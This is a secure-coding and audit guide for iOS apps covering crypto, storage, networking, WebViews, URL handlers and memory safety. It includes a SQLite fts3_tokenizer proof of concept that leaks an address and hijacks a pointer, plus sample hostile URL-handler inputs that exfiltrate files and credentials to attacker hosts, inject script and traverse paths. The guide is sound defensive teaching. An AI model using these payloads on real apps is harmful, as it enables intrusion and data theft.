# Secure iOS application development

This guide is a collection of the most common vulnerabilities found in iOS applications. The focus is on vulnerabilities in the applications’ code and only marginally covers general iOS system security, Darwin security, C/ObjC/C++ memory safety, or high-level application security.

Nevertheless, hopefully the guide can serve as training material to iOS app developers that want to make sure that they ship a more secure app. Also, iOS security reviewers can use it as a reference during assessments.

> __Just like any software, this guide will rot unless we update it. We encourage everyone to help us on that, just open an issue or send a pull request!__



## API-level issues

### API: Generate cryptographically-strong random numbers

Generally, iOS provides easy-to-use cryptographic interfaces. Don’t implement custom crypto algorithms (besides crypto problems, it can also cause issues during App Store review).

Only supply cryptographically-strong random numbers to cryptographic functions.

> **Audit tip:** Check that all cryptographically secure random numbers are
> fetched using the Randomization Services programming interface.

Correct example:

    int r = SecRandomCopyBytes(kSecRandomDefault, sizeof(int), (uint8_t*) &res);

### API: Prevent leaking sensitive data during app backgrounding

When iOS backgrounds an app, a screenshot of the app used to get saved to an
unencrypted cache on the local file system. This happens for example when the user
presses the home button. Apple recommends developers to hide any sensitive
information before this occurs. However, when testing iOS 10, the screenshot
is stored in the encrypted app sandbox. Therefore it is less of a risk.

If the app is handling sensitive user data, verify that code exists to hide or blur the sensitive elements or the full window.

> **Audit tip:** Check for hiding code in `applicationDidEnterBackground`.

Alternatively, you can set
<code>[allowScreenShot](https://developer.apple.com/library/ios/featuredarticles/iPhoneConfigurationProfileRef/Introduction/Introduction.html#//apple_ref/doc/uid/TP40010206-CH1-SW13)</code>. Using `ignoreSnapshotOnNextApplicationLaunch` seems broken.

### API: Handle the pasteboard securely

If the pasteboard is marked persistent it may get saved to local storage along with
potentially sensitive user data. Also, make sure to clear pasteboard when an application backgrounds.

> **Audit tip:** Check for `UIPasteboardNameGeneral` & `UIPasteboardNameFind`.

### API: Disable auto-correction for sensitive input fields

Some iOS versions cache keyboard entries for auto-correction. This is disabled
for password fields but should be disabled for other sensitive fields (e.g.
credit card number) as well. Set the following to prevent this:

    UITextField autoCorrectionType = UITextAutocorrectionTypeNo

or mark the text field as secure (hidden input) with the `secureTextEntry` attribute.

> **Audit tip:** Check for sensitive non-password input fields (e.g. credit
> card) which do not have `UITextAutoCorrectionNo`.

## Data-handling issues

### Handling data: Deserialize data securely

During deserialization, some objects are re-instantiated in memory. Thus, if the
serialized data originates from an untrusted source, code execution might be possible.

When writing your own classes, it is generally a good idea to comply with the `NSSecureCoding` protocol, to make sure that classes constructed from external sources are the intended class. It is also required by Apple for classes that are used with inter-application communication (`UIActivityViewController`).

> **Audit tip:** Check for insecure deserialization from untrusted sources. Some
> deserialization (`NSCoding`, `NSCoder`) must have checks for the deserialized
> data to be within bounds.

> **Audit tip:** Other deserialization (`CFBundle`, `NSBundle`,
> `NSKeyedUnarchiverDelegate`, `didDecodeObject`, `awakeAfterUsingCoder`) can
> directly lead to code execution by returning different objects during
> deserialization.

> **Audit tip:** Check that nib files are not dynamically loaded from untrusted
> origins.

### Handling data: Avoid SQL Injection

If attacker-supplied strings are concatenated to a SQL query, SQL injection on a
sqlite database may occur. This might leak sensitive information from the
database or inject malicious payloads.

> **Audit tip:** Check for calls to `sqlite3_exec()` and other non-prepared SQL
> functions. The functions `sqlite3_prepare*()` should be used instead.

Incorrect example:

```objectivec
NSString *uid = [myHTTPConnection getUID];
NSString *statement = [NSString StringWithFormat:@"SELECT username FROM users
where uid = '%@'",uid];
const char *sql = [statement UTF8String];
```

Correct example:

```objectivec
const char *sql = "SELECT username FROM users where uid = ?";
sqlite3_prepare_v2(db, sql, -1, &selectUid, NULL);
sqlite3_bind_int(selectUid, 1, uid);
int status = sqlite3_step(selectUid);
```

What's even worse, libsqlite3.dylib in iOS supports `fts3_tokenizer` function, which has two security issues by design. This SQL function has two prototype:

```sql
SELECT fts3_tokenizer(<tokenizer-name>);
SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>);
```

The first from can be abused to leak the base address of libsqlite3.dylib, which breaks ASLR.

```objectivec
FMResultSet *s = [db executeQuery:@"SELECT hex(fts3_tokenizer('simple')) as fts;"];
while ([s next]) {
    NSString *val = [s stringForColumn:@"fts"];
    NSLog(@"val: %@", val); // the address of simpleTokenizerModule in libsqlite3.dylib, in big endian
}
```

If the second argument is given, it registers a new tokenizer and the argument is the address of a virtual function table. This will lead to native code execution via SQLite3 callbacks:

```objectivec
[db executeUpdate:@"select fts3_tokenizer('simple', x'4141414141414141');"]; // a fake virtual table
[db executeUpdate:@"drop table a if exists;"]; // in case the virtual table already extst
FMResultSet *result = [db executeQuery:@"create virtual table a using fts3;"];
NSLog(@"%d", [result next]); // trigger pointer dereference
```

The crash information:

```
thread #1: tid = 0x19ac77, 0x0000000184530764 libsqlite3.dylib`___lldb_unnamed_symbol1073$$libsqlite3.dylib + 1500, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4141414141414149)
```

## App hardening

### Hardening: Enable exploit mitigation compile-time options

In order to make exploiting iOS applications harder for the attacker, make sure you
enable platform exploit mitigation options.

> **Audit tip:** Check that compiler and linker flags for exploit mitigation
> are enabled.

Flags to enable:

*   Objective-C automatic reference counting (`-fobjc-arc`) helps to prevent
    use-after-free and use-after-release bugs. Enabling ARC might not be always
    possible with shared code, performance-sensitive code, or legacy codebases.
    Check with:

    `otool -I -v binary | grep _objc_autorelease`

*   Stack smashing protection (`-fstack-protector-all`). This potentially helps
    to prevent stack buffer overflows. Check with (should be on by default):

    `otool -I -v binary | grep stack_chk_guard`

*   Full ASLR - position independent executable (`-pie`). This makes it harder
    for the attacker to find known code locations. (Apple App Store guards this
    for iPhone 5+ targets). Check with (should be on by default):

    `otool -hv binary | grep PIE`

### Hardening: Check Xcode’s static analysis report

Static analysis can help to reveal memory leak, use-after-free,
use-after-release, and other bugs.

> **Audit tip:** Check the output of Xcode’s "Build & Analyze"

### Hardening: Check that support for third party keyboards is disabled

By default, iOS8+ allows third-party applications to override the built-in
keyboard with may leak keystrokes or words to untrusted parties. Depending on
the application risk profile, this may be both a Security and Compliance issue.
This is how it can be [disabled in Swift](https://stackoverflow.com/questions/34863291/how-does-one-disable-third-party-keyboards-in-swift).

## Network-level issues

### Networking: Use GTMSessionFetcher communication securely

By default,
[GTMSessionFetcher](https://github.com/google/gtm-session-fetcher)
won’t load any non-https URL schemes.

> **Audit tip:** Check that no exceptions are made by using
> `allowedInsecureSchemes`, `allowLocalhostRequest` or
> `GTM_ALLOW_INSECURE_REQUESTS`.

### Networking: Configure App Transport Security (ATS)

By default, apps linked against iOS 9 cannot make unprotected
HTTP connections. Review that the ATS configuration is correct.

> **Audit tip:** Check that no exceptions are done in the `Info.plist`.

> **Audit tip:** Check that the list of HTTPS domains in the `Info.plist` is
> correct.

In iOS 10, some new exceptions are available:

1. Exception for streaming media using `AVFoundation`

1. `NSAllowsArbitraryLoadsInWebContent` will exempt ATS in `WKWebView`

### Networking: Use native TLS/SSL securely

SSL should be used on all communication to prevent attackers from reading or
modifying traffic on the network.

> **Audit tip:** Check that all APIs besides local WebViews use SSL (https
> scheme, no http).

> **Audit tip:** Check that authorization tokens are never be passed in URLs but
> only in headers of HTTPS requests (e.g. as a Cookie header). The concern here
> is that they are unintentionally logged on a ISP/company proxy or accidentally
> leaked through referrers without the user’s knowledge.
>
> **Audit tip:** Check that no debug options for SSL have been enabled in the
> release build:
>
> *   `NSStream:`
>     *   `kCFStreamSSLLevel`
>     *   `kCFStreamSSLAllowsExpiredCertificates`
>     *   `kCFStreamSSLAllowsAnyRoot`
>     *   `kCFStreamSSLAllowsExpiredRoots`
>     *   `kCFStreamSSLValidatesCertificateChain`
> *   `NSURLRequest`
>     *   `setAllowsAnyHTTPSCertificate`
> *   `NSURLConnection`
>     *   `continueWithoutCredentialForAuthenticationChallenge`
> *   `ValidatesSecureCertificate`
> *   `setValidatesSecureCertificate`

## Issues with IO

### IO: Validate incoming URL handler calls

URI handlers are special entry points to the application and can be called from
email, chat, browser or other applications. They can be used as delivery vehicles for attacks that exploit logic bugs, XSS, XSRF-style bugs or buffer-overflows.

> **Audit tip:** Check for URI handlers registered and handled by the
> application (`registerForRemoteNotificationTypes` and `handleOpenURL`).

To illustrate the problem, some attack ideas that could be feasible:

``` 
myapp://cmd/run?program=/path/to/program/to/run
myapp://cmd/set_preference?use_ssl=false
myapp://cmd/sendfile?to=evil@attacker.com&file=some/data/file
myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on
myapp://cmd/login_to?server_to_send_credentials=malicious.webserver.com
myapp://cmd/adduser='>"><script>javascript to run goes here</script>
myapp://use_template?template=/../../../../../../../../some/other/file
```

> **Audit tip:** Check that `userInfo` and `launchOptions` are validated during
> parsing of URI request. For actions after the URL handler, it is important to ask user for
> confirmation before taking action.

Additionally, note that other applications could be able to register the same URL handler and intercept requests. When passing highly sensitive information it is preferable to sign and/or encrypt URL handler-transmitted data to prevent leakage and/or forgery.


### IO: Validate outgoing requests and URL handlers

> **Audit tip:** Check for outgoing requests made by an `UIWebView`. Only a
> certain whitelist of schemes should be allowed (http/https) to avoid `file:`,
> `facetime:`, `facetime-audio:`, `sms:`,
> or other `app-id:` URLs. Make sure to filter `tel:` URLs (or require user confirmation)
> because they can be used to automatically dial a cost incurring phone number.

The correct way to check an outgoing request is shown below:

```objectivec
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest
  *)request navigationType:(UIWebViewNavigationType)navigationType;
```

If you are using `WKWebView` you'll need to use the
`-webView:decidePolicyForNavigationAction:decisionHandler:` method in the
`WKNavigationDelegate` protocol to catch requests like these.

### IO: Prevent WebView UI redressing

> **Audit tip:** Check for WebViews which would allow for browser UI redressing,
> for example a full screen WebView which could display an UI similar to the
> original App or to a login screen. Such WebViews could be used by attackers
> to do phishing.

> **Audit tip:** Check for WebViews which would allow browsing the web like a
> browser but don't provide typical browser security UI like an URL bar
> indicating the domain and TLS status. Also, make sure that if the WebView allows
> browsing the web, common browser security feature like mixed-content prevention
> are still present in the WebView.

### IO: Avoid XSS in WebViews

> **Audit tip:** Check how the `UIWebView`/`WKWebView` is handling strings because attacks
> similar to XSS can occur. An XSS in a `UIWebView` can potentially leak local files, for
> example the address book and cookies. XSS in `WKWebView` is more restricted because
> `AllowUniversalAccessFromFileURLs` and `AllowFileAccessFromFileURLs` are off by default.
> Also make sure that the WebView is not prone to redirection which can be utilized for
> phishing.

### IO: Avoid local HTML preview with UIWebView

> **Audio tip:** Check if file preview functionality is implement with UIWebView. It has
> the same impact with XSS, except the whole page is under control of attackers. Since the
> origin is `file://`, UIWebView allows read local files and send AJAX request to arbitrary
> third party websites.
>
> Make sure to use
> [QLPreviewController](https://developer.apple.com/documentation/quicklook/qlpreviewcontroller)
> to preview file attachments. It disables javascript on iOS <=9, otherwise it uses WKWebView
> which doesn't allow local file and cross domain internet access by default.

## Memory corruption issues

### Memory: Prevent NULL byte injection

CF/NS strings contain NULL bytes at different locations. When an insecure
conversion occurs a string could terminate early.

> **Audit tip:** Check for incorrect conversion between the raw bytes of the
> `CFDataRef / CFStringRef / NSString` and C strings.

This example shows incorrect conversion:

```objectivec
NSString *fname = @"user_supplied_image_name\0";
NSString *sourcePath = [[NSString alloc] initWithFormat:@"%@/%@.jpg",
                        [[NSBundle mainBundle] resourcePath],
                        fname];
printf("%s", [sourcePath
UTF8String]);
// prints [...]Products/Debug/user_supplied_image_name without the .jpg ending
```

### Memory: Prevent format string attacks

Format string attacks can be mounted on traditional functions (`printf`, `scanf`,
`syslog`, etc.), but also on iOS platform functions. The Xcode Build & Analyze
option should catch most missing format strings.

> **Audit tip:** Check for missing format strings for the following functions:

*   `CFStringCreateWithFormat`
*   `CFStringCreateWithFormatAndArguments`
*   `CFStringAppendFormat`
*   `[NSString stringWithFormat:]` and other `NSString` methods that take
    formatted strings as arguments:
    *   `[NSString initWithFormat:]`
    *   `[NSString *WithFormat]`
    *   `[NSString stringByAppendingFormat]`
    *   `appendingFormat`
    *   Wrong example:

        `[x stringByAppendingFormat:[UtilityClass formatStuff:attacker.text]];`

    *   Correct example:

        `[x stringByAppendingFormat:@"%@", [UtilityClass formatStuff:attacker.text]];`

*   `[NSMutableString appendFormat]`
*   `[NSAlert alertWithMessageText]`
*   `[NSPredicate predicateWithFormat:]`
*   `[NSPredicate predicateWithFormat:arguments:]`
*   `[NSException raise:format:]` and `[NSException raise:format:arguments:]`
*   `NSRunAlertPanel` and other Application Kit functions that create or return
    panels or sheets
*   `[NSLog]`

## Security considerations for apps built with Swift

Keep the following in mind if you're developing iOS apps with Swift:

*   Swift uses Automatic Reference Counting (ARC) by default, which is very helpful.
*   If string interpolation is used, there is no risk of a format string attack.
*   An integer overflow causes a runtime error.
*   Buffer overflows generally cannot occur due to lack of pointers, except when
    `UnsafePointer` is used for C-compatibility.

Also, when handling sensitive memory, be aware that Swift won’t easily let you
erase sensitive data, e.g. passwords. One way to do this is to use `UnsafeMutablePointer` or an
`UnsafeCollection` (see [Secure Memory for Swift
Objects](http://stackoverflow.com/questions/27715985/secure-memory-for-swift-objects)
for more information).

## Guide: Where should I store my data on iOS?

### Where can I store my data?

*   [Keychain
    Services](https://developer.apple.com/library/ios/documentation/Security/Reference/keychainservices/)
    *   Encrypted key/value store designed to hold:
        *   Generic passwords
        *   Internet passwords (password + protocol + server)
        *   Certificates
        *   Private Keys
        *   Identities (certificate + private key)
    *   Max raw value size is ~16MB.
    *   Keychains may be shared (this is how SSO works on iOS) or private to the
        app.
        *   Keychains can only be shared by apps from the same vendor.
        *   Enterprise/Dogfood apps have a different vendor ID compared to Prod.

Your application has access to its own app-specific filesystem sandbox; please
refer to Apple’s [File System Programming
Guide](https://developer.apple.com/library/ios/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW12)
(specifically, the iOS sections) for more details.

*   Documents/
    *   User-created data that should be visible to the user
    *   Optionally visible to the user in iTunes
        *   Subdirectories generally aren’t, special tools can still open them
    *   Backed up
        *   User can disable backup for specific apps
        *   App can disable paths by setting
            <code>[NSURLIsExcludedFromBackupKey](https://developer.apple.com/library/ios/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28)</code>
*   Library/Caches/
    *   Semi-persistent cached files
    *   Not visible to the user
    *   Not backed up
    *   May be deleted by the OS at any time if the app is not running
        *   Managed automatically in response to storage pressure
*   Library/Application Support/
    *   Persistent files necessary to run the app
    *   Not visible to the user
    *   Backed up
        *   User can disable backup for specific apps
        *   App can disable paths by setting
            <code>[NSURLIsExcludedFromBackupKey](https://developer.apple.com/library/ios/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28)</code>
*   Library/Preferences/
    *   As /Application Support/
    *   By convention, only files created with <code>NSUserDefaults</code>
*   Library/*
    *   As /Application Support/
*   tmp/
    *   Non-persistent cached files
    *   Not visible to the user
    *   Not backed up
    *   Periodically deleted by the OS when the app is not running

### Does the OS protect the keychain? How?

The keychain, on modern iOS devices (post-Touch ID) is secured using a [hardware
module](https://www.google.com/search?q=secure+enclave).
There are no known attacks that directly compromise the keychain via hardware or
software; jailbroken devices are vulnerable to certain attacks.

Keychain backups (to iCloud) cannot be recovered without the user’s iCloud
password. Keychain data is not included in local backups unless that backup is
encrypted with a password.

### Does the OS protect my files on disk? How?

Yes, the OS provides four levels of protection. Note that backups to iCloud are
always encrypted and that backups in iTunes are optionally encrypted;
unencrypted backups do not back up data marked in any of the protected classes
below. The device’s filesystem is encrypted on modern iOS on the DMA path; these
options add extra layers of security.

*   `NSFileProtectionComplete` - most secure
    *   Only readable if device is unlocked.
    *   File is closed when the device is locked.
    *   Suitable for most apps and data.
*   `NSFileProtectionCompleteUnlessOpen`
    *   File can only be opened when the device is unlocked.
    *   File is not closed when the device is locked.
    *   File is encrypted when the last open handle is closed.
    *   Suitable for data that is uploaded in the background, etc.
*   `NSFileProtectionCompleteUntilFirstUserAuthentication` **(default)**
    *   File is inaccessible until the device is unlocked once after boot.
    *   Suitable for background processes that should start ASAP after boot.
        *   Geofence data
        *   Bluetooth accessories (e.g. Android Wear)
    *   In general, all user data should be at least at this level.
*   `NSFileProtectionNone` - least secure
    *   No protection.
    *   Suitable for certain applications that must access data immediately on
        boot without any user interaction. This encryption/decryption is
        handled by the OS and the keychain transparently. The relevant
        decryption key is created from the keychain when appropriate and erased
        from memory when appropriate; see [this
        guide](https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/StrategiesforImplementingYourApp/StrategiesforImplementingYourApp.html#//apple_ref/doc/uid/TP40007072-CH5-SW21)
        for more details.

### Where should I store my data?

*   Sensitive and persistent data - credentials, tokens, etc? Keychain.
*   Large sensitive and persistent files?
    *   Save it to the `Library/*` directory.
    *   Exclude it from backups.
        *   Keychain backups have a higher level of security than filesystem
            backups.
    *   Set appropriate encryption options - as secure as possible.
*   Sensitive cache data?
    *   Save it to `Library/Caches/*`
    *   Set appropriate encryption options - as secure as possible.
*   Application configuration?
    *   `NSUserDefaults`? `Library/Preferences/[Name].plist`
    *   Other/custom format? `Library/Application Support/*`
    *   Set appropriate encryption options - as secure as possible.
*   Persistent content that should be backed up?
    *   User-generated and user-visible?
        *   `Documents/*` directory.
        *   Don’t use subdirectories if you want users to use iTunes file
            sharing.
        *   `NSFileProtectionCompleteUntilFirstUserAuthentication` is probably
            the most appropriate option for encryption, if desired.
            *   Note that malware on a trusted computer can access this
                directory if iTunes file sharing is enabled.
    *   Shouldn’t be visible to the user?
        *   `Library/Application Support/*`
        *   Set appropriate encryption options.

## Best practices for storage

### Store files securely

A stolen or lost iOS device can be potentially jailbroken or disassembled and the
contents of the local file system can be read. Therefore iOS app developers need
to make sure to encrypt sensitive information like credentials or other private
information.

Keychain already allows you to prevent items from ever leaving the device or be
included in backups.

In addition to that:

*   Items can be made to require user consent when accessed;
*   That consent can be set to Touch ID with the device password as fallback;
*   Items can be made inaccessible if passcode is removed.

The safest scenario would require flagging items as device-only, requiring Touch
ID for access, and invalidated if passcode is ever removed.

Remember: you can also store any piece of text in Keychain, not just username
and password credentials. Apple uses this to synchronize Wifi credentials
between devices so that when you connect your laptop to a network, your phone
will be able to as well a few seconds later when synchronization finishes,
saving you from entering those long passwords on your phone. For more
information on the details check out the [Apple iOS Security white
paper](http://www.apple.com/business/docs/iOS_Security_Guide.pdf).

> **Audit tip:** Check for stored data which is not using
> `kSecAttrAccessibleWhenUnlocked` or `kSecAttrAccessibleAfterFirstUnlock`. For
> example, if it is using `kSecAttrAccessibleAlways`, then the data is not
> sufficiently protected.

> **Audit tip:** Check for files created with `NSFileProtectionNone` - they
> have no protection. Note that files created without explicit protection do
> not necessarily use `NSFileProtectionNone`. Make sure one of the following is
used:
>
> *   `NSFileProtectionComplete`
> *   `NSFileProtectionCompleteUnlessOpen` (key stays in memory while locked and
>     file opened)
> *   `NSFileProtectionCompleteUntilFirstUserAuthentication` (key stays in
>     memory when locked)

### Create secure temporary files

> **Audit tip:** Check that secure temporary files and directories are used -
> for example, `URLForDirectory`, `NSTemporaryDirectory`,
> `FSFindFolder(kTemporaryFolderType)`. See also [Create Temporary Files
> Correctly](https://developer.apple.com/library/mac/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW10)
> in the Apple Secure Coding Guide.

### Avoid insecure destination files and APIs

> **Audit tip:** Check for private information (PII) in NSLog/Alog, plist or
> local sqlite databases. It may not be encrypted. Logging is encrypted as of iOS 10.

> **Audit tip:** Check that only appropriate user-specific non-sensitive
information is written to iCloud storage. Use `NSURLIsExcludedFromBackupKey` to
prevent backup of files to iCloud and iTunes.

> **Audit tip:** For the Keychain, check that `kSecAttrSynchronizable` is false
> if the item is not intended for iCloud Keychain backup (it is false by
> default).

> **Audit tip:** Check that
> [NSUserDefaults](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/)
> does only contain settings and no personal information.


## Testing for Devices with Jaibreak

Checking whether a device is jailbroken can be helpful to make certain in-app security decisions. Attackers can run tools like Cycript, GDB, or Snoop-it to perform runtime analysis and steal sensitive data from within your application. Jailbreak detection can prevent that.

> **Audit tip:** Test that the app is not working on jaibroken devices.

<!--

NOTE(felixgr): this code isn't great but we're also not in the business of JB detection so let's just comment it out.

Below is sample code for testing if a device is jailbroken. Note however that Jailbreak tests can be circumvented by skilled attackers and apps should not rely solely on Jailbreak detection as a security control.

```objc
+(BOOL)isJailbroken{
#if !(TARGET_IPHONE_SIMULATOR)
  if ([[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Cydia.app"]){
    return YES;
  }else if([[NSFileManager defaultManager] fileExistsAtPath:@"/Library/MobileSubstrate/MobileSubstrate.dylib"]){
    return YES;
  }else if([[NSFileManager defaultManager] fileExistsAtPath:@"/bin/bash"]){
    return YES;
  }else if([[NSFileManager defaultManager] fileExistsAtPath:@"/usr/sbin/sshd"]){
    return YES;
  }else if([[NSFileManager defaultManager] fileExistsAtPath:@"/etc/apt"]){
    return YES;
  }
 
  NSError *error;
  NSString *stringToBeWritten = @"This is a test.";
  [stringToBeWritten writeToFile:@"/private/jailbreak.txt" atomically:YES encoding:NSUTF8StringEncoding error:&amp;error];
  if(error==nil){
    return YES;
  } else {
    [[NSFileManager defaultManager] removeItemAtPath:@"/private/jailbreak.txt" error:nil];
  }
 
  if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){
    return YES;
  }
#endif
 
  // All checks have failed. Most probably, the device is not jailbroken.
  return NO;
}
```

--->
